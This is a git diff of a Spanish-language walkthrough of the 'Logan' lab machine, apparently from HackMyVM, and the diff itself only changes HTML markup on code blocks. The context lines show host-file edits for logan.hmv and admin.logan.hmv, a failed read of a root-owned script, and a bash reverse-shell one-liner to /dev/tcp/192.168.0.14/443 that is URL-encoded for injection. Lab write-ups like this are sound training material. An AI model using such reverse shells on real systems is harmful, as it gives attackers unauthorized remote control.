@@ -36,7 +36,7 @@ Service Info: Host:  logan.hmv</code></pre>
 
 nmap nos reporta un dominio <code class="language-plaintext highlighter-rouge">logan.hmv</code> agregemos este <code class="language-plaintext highlighter-rouge">dominio</code> al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>
 
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre>
 <code class="language-python"><span style="color: green;">❯ echo </span><span style="color: yellow;">"192.168.0.18 logan.hmv"</span><span class='p'> |</span><span style="color: green;"> sudo tee</span> <span class='p'>-a /etc/hosts</span></code></pre></div></div>
 
 Veamos la Web.
@@ -64,7 +64,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 
 Encontramos un <code class="language-plaintext highlighter-rouge">subdominio</code> agreguemoslo al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre>
 <code class="language-python"><span style="color: green;">❯ echo </span><span style="color: yellow;">"192.168.0.18 admin.logan.hmv"</span><span class='p'> |</span><span style="color: green;"> sudo tee</span> <span class='p'>-a /etc/hosts</span></code></pre></div></div>
 
 Veamos como se ve este <code class="language-plaintext highlighter-rouge">subdominio</code>
@@ -146,7 +146,7 @@ Funciona correctamente.
 
 Para enviarme un <code class="language-plaintext highlighter-rouge">ReverShell</code> voy a usar el siguiente <code class="language-plaintext highlighter-rouge">OneLiner</code>
 
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre>
 <code class="language-python"><span style="color: green;">bash </span><span class='p'>-c </span><span style="color: yellow;">"bash -i >& /dev/tcp/192.168.0.14/443 0>&1"</span></code></pre></div></div>
 
 Tenemos que <code class="language-plaintext highlighter-rouge">Urlencodear</code> todo el comando.
@@ -176,7 +176,7 @@ Tenemos capacidad de ejecutar con <code class="language-plaintext highlighter-ro
 ![](/assets/img/logan/python.png)
 
 Intento ver el contenido del archivo <code class="language-plaintext highlighter-rouge">/opt/learn_some_python.py</code> pero no tenemos capacidad de lectura.
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre>
 <code class="language-python"><span class='p'>logan@logan:/$ </span><span style="color: green;">cat </span><span class='p'>/opt/learn_some_python.py</span>
 <span class='p'>cat: /opt/learn_some_python.py: Permission denied</span></code></pre></div></div>
 
